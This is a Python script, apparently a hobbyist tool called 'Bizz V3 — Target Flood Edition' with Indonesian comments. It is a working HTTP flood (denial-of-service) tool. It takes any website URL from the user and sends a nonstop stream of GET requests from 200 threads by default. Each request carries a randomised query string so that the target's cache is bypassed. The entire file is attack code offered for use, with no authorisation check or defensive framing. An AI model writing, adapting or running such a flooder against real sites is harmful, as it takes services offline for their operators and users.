#!/usr/bin/env python3
"""
Bizz V3 — Target Flood Edition
Input web target -> resolve IP -> flood IP itu dari HP sendiri.
"""

import json
import os
import socket
import sys
import threading
import time
from pathlib import Path
from urllib.parse import urlparse

import requests


CONFIG_PATH = Path(__file__).parent / "config.json"


RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
CYAN    = "\033[96m"
WHITE   = "\033[97m"
MAGENTA = "\033[95m"
RESET   = "\033[0m"
BOLD    = "\033[1m"


BANNER = r"""
  ____  _____ _______ ______
 |  _ \|_   _|__   __|___  /
 | |_) | | |    | |     / /
 |  _ <  | |    | |    / /
 | |_) |_| |_   | |   / /__
 |____/|_____|  |_|  /_____/

        >>  B I Z Z   V 3  <<
        >> target flood edition <<
"""


def clear():
    os.system("clear")


def show_banner():
    print(RED + BOLD + BANNER + RESET)
    print(RED + "#" * 60 + RESET)
    print(RED + "< " + GREEN + "[+] " + WHITE + "Author  : " + CYAN + "Bizz"    + RED + " >" + RESET)
    print(RED + "< " + GREEN + "[+] " + WHITE + "Tools   : " + CYAN + "Bizz V3" + RED + " >" + RESET)
    print(RED + "< " + GREEN + "[+] " + WHITE + "Mode    : " + CYAN + "Target Flood" + RED + " >" + RESET)
    print(RED + "#" * 60 + RESET)
    print()


def resolve_ip(url):
    """Resolve hostname ke IP address."""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    parsed = urlparse(url)
    host = parsed.hostname
    try:
        ip = socket.gethostbyname(host)
        return host, ip, parsed.scheme
    except socket.gaierror:
        return host, None, parsed.scheme


class TargetFlood:
    def __init__(self, url, threads=200, timeout=3):
        self.url = url
        self.threads = threads
        self.timeout = timeout
        self.stop_flag = threading.Event()
        self.counter = {"req": 0, "err": 0}
        self.lock = threading.Lock()
        self._threads = []

    def _worker(self):
        while not self.stop_flag.is_set():
            try:
                # random path biar cache server nggak ngefek
                path = f"/?x={time.time()}&r={threading.get_ident()}"
                full = self.url.rstrip("/") + path
                r = requests.get(
                    full,
                    timeout=self.timeout,
                    headers={"User-Agent": "Mozilla/5.0"},
                    allow_redirects=False,
                )
                with self.lock:
                    self.counter["req"] += 1
            except Exception:
                with self.lock:
                    self.counter["err"] += 1
                time.sleep(0.005)

    def start(self, duration=60):
        print(f"{YELLOW}[*]{RESET} Target URL : {CYAN}{self.url}{RESET}")
        print(f"{YELLOW}[*]{RESET} Threads    : {CYAN}{self.threads}{RESET}")
        print(f"{YELLOW}[*]{RESET} Duration   : {CYAN}{duration}s{RESET}\n")

        self.stop_flag.clear()
        self.counter = {"req": 0, "err": 0}
        self._threads = [
            threading.Thread(target=self._worker, daemon=True)
            for _ in range(self.threads)
        ]
        for t in self._threads:
            t.start()

        start = time.time()
        try:
            while time.time() - start < duration and not self.stop_flag.is_set():
                time.sleep(1)
                elapsed = int(time.time() - start)
                print(
                    f"\r{MAGENTA}[~]{RESET} {elapsed:>3}s | "
                    f"Req: {self.counter['req']:>6} | "
                    f"Err: {self.counter['err']:>6}",
                    end="",
                )
        except KeyboardInterrupt:
            print()

        self.stop_flag.set()
        for t in self._threads:
            t.join(timeout=1)

        print()
        print(f"{GREEN}[+]{RESET} Total Req : {self.counter['req']}")
        print(f"{GREEN}[+]{RESET} Total Err : {self.counter['err']}")


def main():
    clear()
    show_banner()

    # INPUT WEB TARGET
    target = input(f"{CYAN}[?]{RESET} Masukkan URL web target: ").strip()
    if not target:
        print(f"{RED}[!]{RESET} URL kosong.")
        return

    host, ip, scheme = resolve_ip(target)

    if ip:
        print(f"\n{GREEN}[+]{RESET} Hostname : {CYAN}{host}{RESET}")
        print(f"{GREEN}[+]{RESET} IP target: {CYAN}{ip}{RESET}")
        print(f"{GREEN}[+]{RESET} Protocol : {CYAN}{scheme}{RESET}")
    else:
        print(f"{RED}[!]{RESET} Gagal resolve IP target. Cek URL / koneksi.")
        return

    threads = input(f"\n{CYAN}[?]{RESET} Threads (default 200): ").strip() or "200"
    duration = input(f"{CYAN}[?]{RESET} Duration detik (default 60): ").strip() or "60"

    flood = TargetFlood(target, int(threads), 3)
    flood.start(int(duration))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!]{RESET} Interrupted.")
